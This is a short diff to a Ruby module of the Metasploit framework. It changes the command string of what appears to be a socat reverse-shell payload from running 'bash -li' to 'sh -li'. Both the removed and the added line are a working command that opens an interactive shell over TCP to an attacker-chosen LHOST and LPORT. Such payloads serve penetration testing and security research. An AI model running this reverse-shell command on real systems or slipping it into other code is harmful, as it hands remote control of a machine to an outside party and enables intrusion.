@@ -43,6 +43,6 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:#{datastore['LHOST']}:#{datastore['LPORT']}"
+    "socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:#{datastore['LHOST']}:#{datastore['LPORT']}"
   end
 end
